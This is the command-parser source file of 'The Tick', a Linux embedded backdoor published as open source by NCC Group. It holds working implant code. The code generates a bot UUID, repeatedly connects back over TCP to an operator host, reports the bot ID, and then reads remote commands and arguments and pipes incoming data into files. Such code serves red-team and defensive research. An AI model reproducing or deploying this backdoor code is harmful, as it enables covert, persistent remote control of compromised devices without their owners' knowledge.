/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/statvfs.h>
#include <time.h>

#include "parser.h"

#include "command.h"
#include "shell.h"
#include "tcp.h"
#include "file.h"

// Helper function to generate UUIDv4 values.
// Output buffer is assumed to be exactly 16 bytes long.
void uuid4(unsigned char *uuid)
{
    // Generate 16 random numbers using rand().
    // This is really bad but it works as a fallback.
    srand((unsigned int) time(NULL) ^ (unsigned int) getpid());
    for (int i = 0; i < 16; i++) {
        uuid[i] = (unsigned char) (unsigned int) rand();
    }

    // Do it again but this time using /dev/urandom.
    // Since we're overwriting the buffer we get a fallback.
    // Paranoid? Absolutely! ;)
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        int total = 0;
        while (total < 16) {
            int bytes = read(fd, &uuid[total], 16 - total);
            if (bytes <= 0) break;  // should never happen...
            total = total + bytes;
        }
        close(fd);
    }

    // We need to make some bits fixed to follow the RFC.
    uuid[6] = 0x40 | (uuid[6] & 0xf);
    uuid[8] = 0x80 | (uuid[8] & 0x3f);
}

// Initialize the parser.
void parser_init(Parser *parser, const char *hostname, int port, ConnectionCallback callback, void *userdata)
{
    parser->hostname = (char *) hostname;
    parser->port = port;
    parser->callback = callback;
    parser->userdata = userdata;
    parser->fd = -1;
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    uuid4(parser->uuid);
    memset(&parser->buffer, 0, sizeof(parser->buffer));
}

// Closes the file descriptor and resets some internal variables.
void parser_close(Parser *parser)
{
    if (parser->fd >= 0) {
        shutdown(parser->fd, 2);
        close(parser->fd);
    }
    parser->fd = -1;
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    memset(&parser->buffer, 0, sizeof(parser->buffer));
}

// Send a command response header. Data should be sent by the caller.
void parser_begin_response(Parser *parser, uint8_t status, uint16_t length)
{
    RESP_HEADER resp;

    resp.status = status;
    resp.data_len = htonl(length);
    send_block(parser->fd, (const char *) &resp, sizeof(resp));
}

// Send an empty success response.
void parser_ok(Parser *parser)
{
    parser_begin_response(parser, CMD_STATUS_OK, 0);
}

// Send an error response.
void parser_error(Parser *parser, const char *error)
{
    uint16_t length = 0;
    if (error != NULL) {
        length = (uint16_t) strlen(error);
        if (length != strlen(error)) {
            length = 0;
        }
    }
    parser_begin_response(parser, CMD_STATUS_ERROR, length);
    if (length > 0) {
        send_block(parser->fd, error, length);
    }
}

// Test to see if the socket is connected.
int parser_is_connected(Parser *parser)
{
    return (parser->fd >= 0 && send(parser->fd, NULL, 0, MSG_NOSIGNAL) == 0);
}

// If not conected, connects the socket. If connected, does nothing.
void parser_connect(Parser *parser)
{
    // Do nothing if we're already connected.
    if ( ! parser_is_connected(parser) ) {

        // Close the old socket and reset internal variables.
        parser_close(parser);

        // Reconnection only makes sense when using TCP connect back.
        // Make sure this is the case.
        if (parser->hostname != NULL) {

            // Connect to the given hostname and port.
            printf("Connecting to %s:%d...\n", parser->hostname, parser->port);
            while (parser->fd < 0) {
                parser->fd = connect_to_host(parser->hostname, parser->port);
                if (parser->fd < 0) {
                    printf("Error connecting, waiting 30 seconds to retry...\n");
                    sleep(30);  // Sleep 30 seconds between failed attempts
                } else {
                    printf("Connected to %s:%d\n", parser->hostname, parser->port);
                }
            }

            // Send the bot ID immediately after a successful (re)connection.
            send_block(parser->fd, parser->uuid, sizeof(parser->uuid));

            // Invoke the callback. MUST be done after sending the ID.
            if (parser->callback != NULL && ((ConnectionCallback) parser->callback)(parser, parser->userdata) != 0) {
                printf("Callback told us to die!\n");
                parser_close(parser);
                return;
            }

        // If reconnection is not possible, set a fake quit command.
        // This will kill the listener on error.
        } else {
            parser->header.cmd_id = CMD_SYSTEM_EXIT;
            parser->header.cmd_len = 0;
            parser->header.data_len = 0;
        }
    }
}

// Blocking call to wait for the next command.
// Will reconnect the socket automatically if needed.
void parser_wait(Parser *parser)
{

    // Reconnect automatically if needed.
    // If reconnection fails permanently, exit.
    parser_connect(parser);
    if ( ! parser_is_connected(parser) ) {
        return;
    }

    // Read the command block header.
    // Drop and restart if the connection is interrupted.
    // If reconnection fails permanently, exit.
    while (1) {
        memset((void *) &parser->header, 0, sizeof(parser->header));
        if (recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header)) < 0) {
            parser_close(parser);
            parser_connect(parser);
            if ( ! parser_is_connected(parser) ) {
                return;
            }
            continue;
        }
        break;
    }

    // Fix the endianness.
    parser->header.cmd_id = ntohs(parser->header.cmd_id);
    parser->header.cmd_len = ntohs(parser->header.cmd_len);
    parser->header.data_len = ntohl(parser->header.data_len);

    // Clean up the internal buffer.
    memset((void *) &parser->buffer, 0, sizeof(parser->buffer));
}

// Skip all extra data in the socket until the next command header.
void parser_next(Parser *parser)
{
    // If we are connected...
    if (parser_is_connected(parser)) {

        // Calculate how much unread data we have in the socket.
        size_t extra_data = (size_t) parser->header.cmd_len + (size_t) parser->header.data_len;

        // If we have unread data...
        if (extra_data > 0) {

            // Skip as many bytes as needed.
            if (consume_extra_data(parser->fd, extra_data) < 0) {

                // On error, reconnect and reset internal variables.
                parser_connect(parser);

            } else {
                
                // On success, update the internal variables.
                parser->header.cmd_len = 0;
                parser->header.data_len = 0;

            }
        }

    // If we are not connected...
    } else {

        // Reconnect and reset internal variables.
        parser_connect(parser);
    }
}

// Read the first argument for the current command into an arbitrary buffer.
// Note that the argument IS NOT guaranteed to be null terminated!
// Returns the amount of bytes read on success or -1 on error (and drops the connection).
ssize_t parser_read_first_arg(Parser *parser, char *buffer, size_t count)
{
    ssize_t bytes = 0;

    // Discard commands where the first argument is larger than the buffer size.
    if ((size_t) parser->header.cmd_len > count) {
        printf("Error: first argument too long: %d > %d\n", (unsigned int) parser->header.cmd_len, (unsigned int) count);
        parser_error(parser, "first argument to long");
        return -1;
    }

    // Load the first argument into the buffer.
    memset((void *) buffer, 0, count);
    bytes = recv_block(parser->fd, buffer, parser->header.cmd_len);

    // On error drop the connection.
    if (bytes < 0) {
        parser_close(parser);
        return -1;
    }

    // Update the internal counter.
    parser->header.cmd_len = 0;
    return bytes;
}

// Read the first argument for the current command into our internal buffer.
// When using this function, the argument is guaranteed to be null terminated.
// Returns the amount of bytes read on success or -1 on error (and drops the connection).
ssize_t parser_get_first_arg(Parser *parser)
{
    memset(parser->buffer, 0, sizeof(parser->buffer));
    return parser_read_first_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
}

// Read the second argument for the current command into an arbitrary buffer.
// Note that the argument IS NOT guaranteed to be null terminated!
// Returns the amount of bytes read on success or -1 on error (and drops the connection).
ssize_t parser_read_second_arg(Parser *parser, char *buffer, size_t count)
{
    ssize_t bytes = 0;

    // Discard commands where the second argument is larger than the buffer size.
    if ((size_t) parser->header.data_len > count) {
        printf("Error: second argument too long: %d > %d\n", (unsigned int) parser->header.data_len, (unsigned int) count);
        parser_error(parser, "second argument to long");
        return -1;
    }

    // Load the second argument into the buffer.
    memset((void *) buffer, 0, count);
    bytes = recv_block(parser->fd, buffer, parser->header.data_len);

    // On error drop the connection.
    if (bytes < 0) {
        parser_close(parser);
        return -1;
    }

    // Update the internal counter.
    parser->header.data_len = 0;
    return bytes;
}

// Read the second argument for the current command into our internal buffer.
// When using this function, the argument is guaranteed to be null terminated.
// Returns the amount of bytes read on success or -1 on error (and drops the connection).
ssize_t parser_get_second_arg(Parser *parser)
{
    memset(parser->buffer, 0, sizeof(parser->buffer));
    return parser_read_second_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
}

// Pipe the second argument for the current command into a file descriptor.
// Returns the amount of bytes read on success or -1 on error (and drops the connection).
ssize_t parser_pipe_second_arg(Parser *parser, int fd_dst)
{
    ssize_t bytes = parser->header.data_len;
    if (copy_stream(parser->fd, fd_dst, parser->header.data_len) < 0) {
        parser_close(parser);
        return -1;
    }
    parser->header.data_len = 0;
    return bytes;
}
